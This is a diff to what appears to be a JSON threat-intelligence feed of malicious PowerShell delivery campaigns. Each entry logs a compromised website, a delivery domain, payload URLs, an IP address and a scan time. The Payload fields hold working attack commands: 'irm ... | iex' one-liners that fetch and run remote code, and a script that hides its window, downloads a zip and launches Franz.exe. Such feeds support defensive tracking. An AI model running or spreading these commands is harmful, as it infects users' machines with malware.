@@ -1,5 +1,101 @@
 [
   {
+    "UrlDomain": "uludere-haber.cyou",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwxcbcm09810omlo5hpvabj",
+    "ScannedAt": "2026-11-26T02:19:24.234000+00:00"
+  },
+  {
+    "UrlDomain": "venturehub.se",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/gabo58lfmx/0dad23cef5c6b0cc",
+      "https://j7tracker.gb.net/click/80cce9896a29829a"
+    ],
+    "IP": [
+      "160.153.0.11"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/0dad23cef5c6b0cc')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/gabo58lfmx/0dad23cef5c6b0cc"
+    ],
+    "ReportId": "cmwwx6daj09140omlbj2a6pwj",
+    "ScannedAt": "2026-11-26T02:14:46.742000+00:00"
+  },
+  {
+    "UrlDomain": "varvaracostruzioni.it",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/83cd888b8cd4f124"
+    ],
+    "IP": [
+      "185.2.4.22"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/83cd888b8cd4f124')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/83cd888b8cd4f124"
+    ],
+    "ReportId": "cmwwwzkd108tk0omlqsud29or",
+    "ScannedAt": "2026-11-26T02:09:29.324000+00:00"
+  },
+  {
+    "UrlDomain": "topicalbuzz.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/05b20b325b2ab321"
+    ],
+    "IP": [
+      "188.114.96.0"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/05b20b325b2ab321')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/05b20b325b2ab321"
+    ],
+    "ReportId": "cmwwwutah08od0omljlhq0mb2",
+    "ScannedAt": "2026-11-26T02:05:47.651000+00:00"
+  },
+  {
+    "UrlDomain": "viaworks.com.tr",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.203.128"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwwwsblu08jp0omlkp95jw7g",
+    "ScannedAt": "2026-11-26T02:03:51.422000+00:00"
+  },
+  {
     "UrlDomain": "whiteroseformations.co.uk",
     "DeliveryUrl": [
       "friendsoftorreabbey.com"
